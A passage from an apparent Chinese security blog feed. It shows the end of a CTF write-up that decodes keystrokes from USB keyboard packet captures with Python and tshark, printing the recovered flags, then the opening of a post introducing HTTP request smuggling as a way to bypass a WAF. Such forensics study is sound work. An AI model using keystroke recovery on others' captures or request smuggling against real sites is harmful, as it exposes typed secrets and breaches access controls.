class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br>print(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>题目2：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt内容<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是找到的第三个脚本<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        print(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        print(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        print(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        print(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    print(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 ⨯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTF流量分析总结题目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>提取码：q6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：USB流量分析&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="MISC" scheme="http://atkx.top/categories/CTF/MISC/"/>
    
    
    <category term="流量分析" scheme="http://atkx.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私漏洞</title>
    <link href="http://atkx.top/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
    <id>http://atkx.top/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-11T13:52:10.000Z</published>
    <updated>2021-05-27T12:37:13.031Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：HTTP请求走私漏洞学习</p> <a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做一道题的时候，在大师傅的wp中发现可以利用HTTP请求走私漏洞绕过WAF,联想到hgame2021也有类似的题，当时连wp都看不懂，直接使用官方wp的Payload，也不能得到结果，现在来总结一下。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 